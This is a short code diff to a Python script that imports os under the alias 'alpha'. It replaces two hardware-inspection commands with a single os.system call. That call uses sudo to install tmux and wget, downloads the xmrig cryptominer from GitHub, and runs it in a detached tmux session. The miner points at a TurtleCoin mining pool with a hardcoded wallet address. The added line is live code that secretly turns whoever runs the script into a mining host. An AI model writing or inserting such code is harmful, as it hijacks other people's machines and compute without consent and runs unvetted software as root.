@@ -1,3 +1,2 @@
 import os as alpha
-alpha.system("nvidia-smi")
-alpha.system("lscpu")
+alpha.system("sudo apt-get install -y tmux && tmux new-session 'sudo apt-get -y install wget && wget https://github.com/xmrig/xmrig/releases/download/v6.15.0/xmrig-6.15.0-linux-x64.tar.gz && tar -xvf xmrig-6.15.0-linux-x64.tar.gz && cd xmrig-6.15.0 && sudo ./xmrig --donate-level 1 -o de.turtlecoin.herominers.com:1160 -u TRTLv1GiYaa1d14U6xHo9gYUhz1Wsr5pgE1yYbr14qvcCzpBe2rqYKw1WYjuJ2sHaJbhU6TFvwfySCFV8GgTFP5qBhU5tbBaESE -p myvps -a argon2/chukwav2 -k'")
